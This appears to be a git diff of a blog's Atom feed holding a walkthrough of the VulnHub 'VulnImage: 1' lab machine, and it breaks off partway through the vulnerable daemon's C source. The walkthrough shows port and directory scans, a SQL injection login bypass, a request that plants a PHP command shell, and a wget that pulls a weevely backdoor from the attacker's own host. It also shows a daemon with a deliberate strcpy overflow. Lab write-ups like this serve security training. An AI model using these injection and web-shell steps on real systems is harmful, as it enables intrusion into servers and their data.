@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vulnimage | 0x73696e65]]></title>
   <link href="http://73696e65.github.io/blog/categories/vulnimage/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-07-06T17:32:40+02:00</updated>
+  <updated>2015-07-06T17:36:02+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -21,498 +21,277 @@
     <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/vulnimage-1,39/">VulnImage: 1</a></p>
 
 <p>Nmap output:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE     VERSION
-</span><span class='line'>22/tcp   open  ssh         OpenSSH 5.1p1 Debian 5 (protocol 2.0)
-</span><span class='line'>25/tcp   open  smtp        Exim smtpd 4.50
-</span><span class='line'>80/tcp   open  http        Apache httpd 2.2.9 ((Debian) PHP/5.2.6-1+lenny9 with Suhosin-Patch)
-</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-</span><span class='line'>445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-</span><span class='line'>3306/tcp open  mysql       MySQL 5.0.51a-24+lenny4
-</span><span class='line'>7777/tcp open  cbt?</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 5.1p1 Debian 5 (protocol 2.0)
+25/tcp   open  smtp        Exim smtpd 4.50
+80/tcp   open  http        Apache httpd 2.2.9 ((Debian) PHP/5.2.6-1+lenny9 with Suhosin-Patch)
+139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL 5.0.51a-24+lenny4
+7777/tcp open  cbt?
+{% endcodeblock %}</p>
 
 <p>With dirb we found a few interesting directories (repo, admin, profiles),
 directory listing is enabled:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&mdash;- Scanning URL: &lt;a href="http://192.168.80.143/">http://192.168.80.143/&lt;/a> &mdash;-
-</span><span class='line'>+ &lt;a href="http://192.168.80.143/index">http://192.168.80.143/index&lt;/a> (CODE:200|SIZE:71)  &lt;br/>
-</span><span class='line'>+ &lt;a href="http://192.168.80.143/view">http://192.168.80.143/view&lt;/a> (CODE:200|SIZE:166)  &lt;br/>
-</span><span class='line'>==> DIRECTORY: &lt;a href="http://192.168.80.143/admin/">http://192.168.80.143/admin/&lt;/a>  &lt;br/>
-</span><span class='line'>==> DIRECTORY: &lt;a href="http://192.168.80.143/profiles/">http://192.168.80.143/profiles/&lt;/a>  &lt;br/>
-</span><span class='line'>==> DIRECTORY: &lt;a href="http://192.168.80.143/repo/">http://192.168.80.143/repo/&lt;/a>  &lt;br/>
-</span><span class='line'>+ &lt;a href="http://192.168.80.143/myblog">http://192.168.80.143/myblog&lt;/a> (CODE:200|SIZE:736)  &lt;br/>
-</span><span class='line'>+ &lt;a href="http://192.168.80.143/server-status">http://192.168.80.143/server-status&lt;/a> (CODE:403|SIZE:332)  &lt;br/></span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+&mdash;- Scanning URL: <a href="http://192.168.80.143/">http://192.168.80.143/</a> &mdash;-
++ <a href="http://192.168.80.143/index">http://192.168.80.143/index</a> (CODE:200|SIZE:71)  <br/>
++ <a href="http://192.168.80.143/view">http://192.168.80.143/view</a> (CODE:200|SIZE:166)  <br/>
+==> DIRECTORY: <a href="http://192.168.80.143/admin/">http://192.168.80.143/admin/</a>  <br/>
+==> DIRECTORY: <a href="http://192.168.80.143/profiles/">http://192.168.80.143/profiles/</a>  <br/>
+==> DIRECTORY: <a href="http://192.168.80.143/repo/">http://192.168.80.143/repo/</a>  <br/>
++ <a href="http://192.168.80.143/myblog">http://192.168.80.143/myblog</a> (CODE:200|SIZE:736)  <br/>
++ <a href="http://192.168.80.143/server-status">http://192.168.80.143/server-status</a> (CODE:403|SIZE:332)  <br/>
+{% endcodeblock %}</p>
 
 <p>Submitting the quote gives an error SQL message:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.143/admin/profile.php">http://192.168.80.143/admin/profile.php&lt;/a>
-</span><span class='line'>Username: &lsquo;
-</span><span class='line'>Password a&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>&hellip;
-</span><span class='line'>SELECT * FROM blog_users WHERE poster = &lsquo;&rsquo;&lsquo; AND password = 'a&rsquo;</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+<a href="http://192.168.80.143/admin/profile.php">http://192.168.80.143/admin/profile.php</a>
+Username: &lsquo;
+Password a</p>
+
+<p>&hellip;
+SELECT * FROM blog_users WHERE poster = &lsquo;&rsquo;&lsquo; AND password = &#8216;a&rsquo;
+{% endcodeblock %}</p>
 
 <p>After a few minutes of playing with requests we realize that we can create
 files in format &lsquo;username-fname&rsquo; and with the content of &lsquo;sig&rsquo; parameter.
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>POST /admin/profile.php HTTP/1.1
-</span><span class='line'>Host: 192.168.80.143
-</span><span class='line'>User-Agent: Mozilla/5.0
-</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&lt;em>/&lt;/em>;q=0.8
-</span><span class='line'>Accept-Language: en-US,en;q=0.5
-</span><span class='line'>Accept-Encoding: gzip, deflate
-</span><span class='line'>DNT: 1
-</span><span class='line'>Referer: &lt;a href="http://192.168.80.143/admin/profile.php">http://192.168.80.143/admin/profile.php&lt;/a>
-</span><span class='line'>Connection: keep-alive
-</span><span class='line'>Cache-Control: max-age=0
-</span><span class='line'>Content-Type: application/x-www-form-urlencoded
-</span><span class='line'>Content-Length: 104&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>username=testa&amp;password=test' or &lsquo;2&rsquo;=&lsquo;2&amp;sig=&lt;?php system($_REQUEST['cmd&rsquo;]); ?>&amp;fname=x.php&amp;submit=Submit</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+POST /admin/profile.php HTTP/1.1
+Host: 192.168.80.143
+User-Agent: Mozilla/5.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: <a href="http://192.168.80.143/admin/profile.php">http://192.168.80.143/admin/profile.php</a>
+Connection: keep-alive
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 104</p>
+
+<p>username=testa&amp;password=test&#8217; or &lsquo;2&rsquo;=&lsquo;2&amp;sig=&lt;?php system($_REQUEST[&#8216;cmd&rsquo;]); ?>&amp;fname=x.php&amp;submit=Submit
+{% endcodeblock %}</p>
 
 <p>Now we have a simple PHP shell:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.143/profiles/testa-x.php?cmd=id">http://192.168.80.143/profiles/testa-x.php?cmd=id&lt;/a>&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+<a href="http://192.168.80.143/profiles/testa-x.php?cmd=id">http://192.168.80.143/profiles/testa-x.php?cmd=id</a></p>
+
+<p>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+{% endcodeblock %}</p>
 
 <p>We download the weevely.php from our server and connect:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.143/profiles/testa-x.php?cmd=wget">http://192.168.80.143/profiles/testa-x.php?cmd=wget&lt;/a> 192.168.80.137/weevely.php.txt -O c.php
-</span><span class='line'>root@kali32:~# weevely &lt;a href="http://192.168.80.143/profiles/c.php">http://192.168.80.143/profiles/c.php&lt;/a> 1234</span></code></pre></td></tr></table></div></figure></p>
+{% codeblock %}
+<a href="http://192.168.80.143/profiles/testa-x.php?cmd=wget">http://192.168.80.143/profiles/testa-x.php?cmd=wget</a> 192.168.80.137/weevely.php.txt -O c.php
+root@kali32:~# weevely <a href="http://192.168.80.143/profiles/c.php">http://192.168.80.143/profiles/c.php</a> 1234
+{% endcodeblock %}</p>
 
 <p>In the repo directory, we examine the buffd.c. It is a vulnerable daemon,
 listening on port 7777.
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-<span class='line-number'>78</span>
-<span class='line-number'>79</span>
-<span class='line-number'>80</span>
-<span class='line-number'>81</span>
-<span class='line-number'>82</span>
-<span class='line-number'>83</span>
-<span class='line-number'>84</span>
-<span class='line-number'>85</span>
-<span class='line-number'>86</span>
-<span class='line-number'>87</span>
-<span class='line-number'>88</span>
-<span class='line-number'>89</span>
-<span class='line-number'>90</span>
-<span class='line-number'>91</span>
-<span class='line-number'>92</span>
-<span class='line-number'>93</span>
-<span class='line-number'>94</span>
-<span class='line-number'>95</span>
-<span class='line-number'>96</span>
-<span class='line-number'>97</span>
-<span class='line-number'>98</span>
-<span class='line-number'>99</span>
-<span class='line-number'>100</span>
-<span class='line-number'>101</span>
-<span class='line-number'>102</span>
-<span class='line-number'>103</span>
-<span class='line-number'>104</span>
-<span class='line-number'>105</span>
-<span class='line-number'>106</span>
-<span class='line-number'>107</span>
-<span class='line-number'>108</span>
-<span class='line-number'>109</span>
-<span class='line-number'>110</span>
-<span class='line-number'>111</span>
-<span class='line-number'>112</span>
-<span class='line-number'>113</span>
-<span class='line-number'>114</span>
-<span class='line-number'>115</span>
-<span class='line-number'>116</span>
-<span class='line-number'>117</span>
-<span class='line-number'>118</span>
-<span class='line-number'>119</span>
-<span class='line-number'>120</span>
-<span class='line-number'>121</span>
-<span class='line-number'>122</span>
-<span class='line-number'>123</span>
-<span class='line-number'>124</span>
-<span class='line-number'>125</span>
-<span class='line-number'>126</span>
-<span class='line-number'>127</span>
-<span class='line-number'>128</span>
-<span class='line-number'>129</span>
-<span class='line-number'>130</span>
-<span class='line-number'>131</span>
-<span class='line-number'>132</span>
-<span class='line-number'>133</span>
-<span class='line-number'>134</span>
-<span class='line-number'>135</span>
-<span class='line-number'>136</span>
-<span class='line-number'>137</span>
-<span class='line-number'>138</span>
-<span class='line-number'>139</span>
-<span class='line-number'>140</span>
-<span class='line-number'>141</span>
-<span class='line-number'>142</span>
-<span class='line-number'>143</span>
-<span class='line-number'>144</span>
-<span class='line-number'>145</span>
-<span class='line-number'>146</span>
-<span class='line-number'>147</span>
-<span class='line-number'>148</span>
-<span class='line-number'>149</span>
-<span class='line-number'>150</span>
-<span class='line-number'>151</span>
-<span class='line-number'>152</span>
-<span class='line-number'>153</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">debian</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">repo</span><span class="o">/</span><span class="n">buffd</span><span class="p">.</span><span class="n">c</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">errno</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">socket</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">netinet</span><span class="o">/</span><span class="n">in</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">netdb</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">arpa</span><span class="o">/</span><span class="n">inet</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">wait</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">signal</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">PORT</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">7777</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="c1">// the port users will be connecting to&lt;/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">BACKLOG</span> <span class="mi">10</span>       <span class="c1">// how many pending connections queue will hold&lt;/h1&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">vulnerable</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">net_buffer</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'><span class="kt">char</span> <span class="n">local_buffer</span><span class="p">[</span><span class="mi">120</span><span class="p">];</span>
-</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">local_buffer</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">);</span>
-</span><span class='line'><span class="k">return</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">sigchld_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">WNOHANG</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// get sockaddr, IPv4 or IPv6:</span>
-</span><span class='line'><span class="kt">void</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">get_in_addr</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">sa</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">sa</span><span class="o">-&gt;</span><span class="n">sa_family</span> <span class="o">==</span> <span class="n">AF_INET</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="k">return</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;(((</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="o">*</span><span class="p">)</span><span class="n">sa</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sin_addr</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">return</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;(((</span><span class="k">struct</span> <span class="n">sockaddr_in6</span><span class="o">*</span><span class="p">)</span><span class="n">sa</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sin6_addr</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">new_fd</span><span class="p">;</span> <span class="c1">// listen on sock_fd, new connection on new_fd</span>
-</span><span class='line'><span class="k">struct</span> <span class="n">addrinfo</span> <span class="n">hints</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">servinfo</span><span class="p">,</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">p</span><span class="p">;</span>
-</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr_storage</span> <span class="n">their_addr</span><span class="p">;</span> <span class="c1">// connector&amp;rsquo;s address information</span>
-</span><span class='line'><span class="kt">socklen_t</span> <span class="n">sin_size</span><span class="p">;</span>
-</span><span class='line'><span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sa</span><span class="p">;</span>
-</span><span class='line'><span class="kt">int</span> <span class="n">yes</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
-</span><span class='line'><span class="kt">char</span> <span class="n">in_buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">out_buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">net_buffer</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
-</span><span class='line'><span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="n">INET6_ADDRSTRLEN</span><span class="p">];</span>
-</span><span class='line'><span class="kt">int</span> <span class="n">rv</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">hints</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">hints</span><span class="p">);</span>
-</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span><span class="p">;</span>
-</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_socktype</span> <span class="o">=</span> <span class="n">SOCK_STREAM</span><span class="p">;</span>
-</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_flags</span> <span class="o">=</span> <span class="n">AI_PASSIVE</span><span class="p">;</span> <span class="c1">// use my IP&lt;/p&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">((</span><span class="n">rv</span> <span class="o">=</span> <span class="n">getaddrinfo</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">hints</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">servinfo</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">getaddrinfo</span><span class="p">:</span> <span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">gai_strerror</span><span class="p">(</span><span class="n">rv</span><span class="p">));</span>
-</span><span class='line'><span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// loop through all the results and bind to the first we can</span>
-</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">servinfo</span><span class="p">;</span> <span class="n">p</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_next</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="k">if</span> <span class="p">((</span><span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_family</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_socktype</span><span class="p">,</span>
-</span><span class='line'><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_protocol</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">server</span><span class="p">:</span> <span class="n">socket</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="k">continue</span><span class="p">;</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">yes</span><span class="p">,</span>
-</span><span class='line'><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">setsockopt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
